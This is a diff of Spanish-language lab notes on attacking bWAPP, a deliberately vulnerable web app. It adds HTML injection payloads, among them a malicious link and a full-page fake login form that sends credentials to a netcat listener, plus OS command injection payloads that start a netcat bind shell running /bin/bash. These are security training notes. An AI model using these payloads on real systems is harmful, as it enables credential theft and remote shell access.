@@ -27,16 +27,42 @@ ataque --> mandar a la victima la URL 'tuneada'
 [http://192.168.1.106/bWAPP/]htmli_get.php?firstname=<h1>Hola Hackers</h1>&lastname=<img src="https://img.gallerix.com/product/4592_36741.jpg">&form=submit
 
 
-------  HHTML Injection - Stored (Blog)
+------  HTML Injection - Stored (Blog)
 - uso normal: introducir uno/varios comentario en el blog
-- ataque --> inyectar un comentario que contiene un formulario de login patra capturar las credenciales
+- comprobacion de que no se validan los datos de entrada: 
+<h1>Hola Hackers<h1>
+- 1 ataque --> introducir una url que te lleve a un lugar con malware
+<a href="https://www.ttx.es/pwned.html">Haz click aquí</a>
+- 2 ataque --> inyectar un comentario que contiene un formulario de login patra capturar las credenciales
 <div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://localhost:8080/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
 - abrir un listener en una consola en una IP:puerto (aquí localhost:8080) 
 sudo nc -vlp 8080
 
 
+------ OS command injection 
+- uso normal: DNS Lookup de un dominio
+- Ataque 
+ && nc -vlp 4444 -e /bin/bash
+; nc -vlp 4444 -e /bin/bash
+comprobar en un a consola
+
+
+
+
+
+---- BURPSUITE --------------------
+https://writeups.kunull.net/bWAPP/
+
+
+
+
+************* EXTRAS ***************************
+1
+This post contains the steps to get a root shell with bWapp VM: https://paulsec.github.io/posts/bwapp-write-up/
+
+
 https://www.hackplayers.com/2017/06/diseccionando-bwapp-html-injection.html
-captira de página de login e inyección en los campos del forulario
+captura de página de login e inyección en los campos del formulario
 user:
 </div><div id="mai"><h1>Login</h1><p>Enter your credentials <i>(bee/bug)</i>.</p><form action="/bWAPP/login.php" method="POST"><p><label for="login">Login:</label><br /><input type="text" id="login" name="login" size="20" autocomplete="off"></p> <p><label for="password">Password:</label><br /><input type="password" id="password" name="password" size="20" autocomplete="off"></p><p><label for="security_level">Set the security level:</label><br /><select name="security_level"><option value="0">low</option><option value="1">medium</option><option value="2">high</option></select></p><button type="submit" name="form" value="submit">Login</button></form><br /></div>
 password:
